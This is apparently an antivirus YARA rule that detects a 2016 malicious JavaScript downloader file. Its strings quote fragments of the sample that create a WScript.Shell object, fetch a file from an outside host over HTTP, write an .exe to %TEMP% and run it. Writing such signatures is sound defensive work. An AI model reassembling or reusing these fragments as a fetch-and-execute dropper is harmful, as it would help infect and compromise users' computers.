rule sig_20160328_5514949631cd8135096656a6589e947d {
  meta:
    description = "datamaliciousorder - file 20160328_5514949631cd8135096656a6589e947d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0893e92b380cff49231267a0c34bdbe316c3781de4f75a5c6e16a5d89e1b57f8"

  strings:
    $s1  = "function Veudztcen() {return Oiyimp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"YHYb5TD6XUN.exe\";};" fullword ascii
    $s2  = "Yghvwn[Kbxzzmhw](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Woiyw](Arimxm() * 11)} while (Yghvwn[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Jxwrhr(Uokhiidu, Rnjmqui){return Uokhiidu - Rnjmqui;};" fullword ascii
    $s5  = "var Oiyimp = function Rlkjpwo() {return WScript[Ryvhwlnxfx](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Axqfe(Nesyt){Oiyimp[\"Run\"](Nesyt, Bvkxdi, Bvkxdi);};" fullword ascii
    $s7  = "function Ayvyn() {return ((Zzenkwfv == true) && (Zzenkwfv == Hpxbcqzndq)) ? 1 : Bvkxdi;};" fullword ascii
    $s8  = "var Ayhiw = false;" fullword ascii
    $s9  = "Hpxbcqzndq = true; " fullword ascii
    $s10 = "return Jxwrhr(Uehkza, Gauoaug);" fullword ascii
    $s11 = "var Cwqfor = new this[\"Date\"]();" fullword ascii
    $s12 = "function Arimxm(){return 22;};" fullword ascii
    $s13 = "function Vbhhtq(Dofebild) {var Gbvearp = (1, 2, 3, 4, 5, Dofebild); return Gbvearp;};" fullword ascii
    $s14 = "function Jadniet(){return Thbysknh;};" fullword ascii
    $s15 = " while (Ppliy){" fullword ascii
    $s16 = "var Zzenkwfv = false;" fullword ascii
    $s17 = "function Yliffhabuh(){return Ryvhwlnxfx;};" fullword ascii
    $s18 = "var Hpxbcqzndq = false;" fullword ascii
    $s19 = "Zzenkwfv = true; " fullword ascii
    $s20 = "function Ojwtxnhndp()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}